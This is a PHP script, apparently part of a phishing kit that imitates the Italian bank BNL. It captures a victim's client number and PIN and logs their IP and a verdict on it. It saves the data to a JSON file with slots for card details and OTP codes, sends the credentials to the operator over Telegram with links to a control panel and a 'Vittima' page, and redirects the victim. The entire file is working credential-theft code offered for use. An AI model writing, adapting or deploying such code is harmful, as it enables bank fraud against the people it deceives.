<?php
require_once __DIR__ . '/telegram_config.php';

$nc  = trim($_POST['numeroCliente'] ?? '');
$pin = trim($_POST['pin'] ?? '');
$ip  = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$sid = trim($_POST['session_id'] ?? '');

if (!$nc || !$pin) { header('Location: index.html'); exit; }

$df  = __DIR__ . '/data.json';
$data = file_exists($df) ? json_decode(file_get_contents($df), true) : ['sessions' => []];
if (!isset($data['sessions'])) $data['sessions'] = [];

$ipA = analyze_ip($ip);

// Si session_id existe et valide → update la session existante
if ($sid && isset($data['sessions'][$sid])) {
    $id = $sid;
    $data['sessions'][$id]['nc']         = $nc;
    $data['sessions'][$id]['pin']        = $pin;
    $data['sessions'][$id]['ip']         = $ip;
    $data['sessions'][$id]['verdict']    = $ipA['verdict'];
    $data['sessions'][$id]['isp']        = $ipA['detail'];
    $data['sessions'][$id]['status']     = 'waiting';
    $data['sessions'][$id]['next_page']  = '';
    $data['sessions'][$id]['force_redirect'] = 0;
    $data['sessions'][$id]['updated_at'] = date('Y-m-d H:i:s');

    $label = '🔄 RETRY';
} else {
    // Nouvelle session
    $id = bin2hex(random_bytes(16));
    $data['sessions'][$id] = [
        'id'             => $id,
        'nc'             => $nc,
        'pin'            => $pin,
        'ip'             => $ip,
        'verdict'        => $ipA['verdict'],
        'isp'            => $ipA['detail'],
        'status'         => 'waiting',
        'next_page'      => '',
        'force_redirect' => 0,
        'carta_numero'   => '', 'carta_scadenza' => '', 'carta_cvv' => '',
        'otp_sms'        => '', 'otp_mail'       => '',
        'created_at'     => date('Y-m-d H:i:s'),
        'updated_at'     => date('Y-m-d H:i:s')
    ];

    $label = '🆕 NEW';
}

file_put_contents($df, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

$proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$base  = rtrim($proto . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']), '/');

$msg = "🏦 <b>BNL LOGIN</b> ({$label})\n"
     . "━━━━━━━━━━━━━━━\n"
     . "🔑 NC: <code>{$nc}</code>\n"
     . "🔑 PIN: <code>{$pin}</code>\n"
     . "━━━━━━━━━━━━━━━\n"
     . "🌐 IP: {$ip} | <b>{$ipA['verdict']}</b>\n"
     . "📍 {$ipA['detail']}\n"
     . "🆔 <code>{$id}</code>\n"
     . "━━━━━━━━━━━━━━━\n"
     . "🎛 <a href=\"{$base}/panel.php?id={$id}\">Pannello</a>\n"
     . "👤 <a href=\"{$base}/verifica.php?id={$id}\">Vittima</a>";

tg_send($msg);

header("Location: verifica.php?id={$id}");
exit;
